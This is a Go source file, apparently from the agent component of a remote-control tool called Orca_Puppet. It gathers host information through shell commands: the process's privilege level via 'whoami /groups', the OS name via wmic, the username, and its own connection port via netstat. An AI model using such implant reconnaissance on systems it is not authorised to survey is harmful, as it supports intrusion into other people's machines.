package listopt

import (
	"Orca_Puppet/cli/cmdopt/shellopt"
	"errors"
	"fmt"
	"os"
	"os/user"
	"strings"
)

// 获取当前执行身份 (user/admin/system)
func GetExecPrivilege() string {
	ac, _ := shellopt.Cmd("(whoami /groups |findstr Mandatory|findstr System > nul && echo system)||(whoami /groups |findstr Mandatory|findstr High > nul && echo admin)||echo user")
	b := strings.Replace(ac, "\n", "", -1)
	status := strings.Replace(b, "\r", "", -1)
	return status
}

// 获取操作系统信息
func GetOsName() string {
	ac, err := shellopt.Cmd("wmic os get Caption /value")
	if err != nil {
		return ""
	}
	b := strings.Replace(ac, "\n", "", -1)
	c := strings.Replace(b, "\r", "", -1)
	sysVersion := strings.Replace(c, "Caption=", "", -1)
	return sysVersion
}

func GetHostName() string {
	u, _ := user.Current()
	hostname := strings.Replace(u.Username, "\\", "/", -1)
	return hostname
}

func GetConnPort() (string, error) {
	pid := os.Getpid()
	cmd := fmt.Sprintf("netstat -ano | findstr %d", pid)
	ac, err := shellopt.Cmd(cmd)
	if err != nil {
		return "", err
	}
	context := strings.Fields(ac)
	ipAndPort := context[1]
	_, port, f := strings.Cut(ipAndPort, ":")
	if !f {
		return "", errors.New("ip and port cut error")
	}
	return port, nil
}
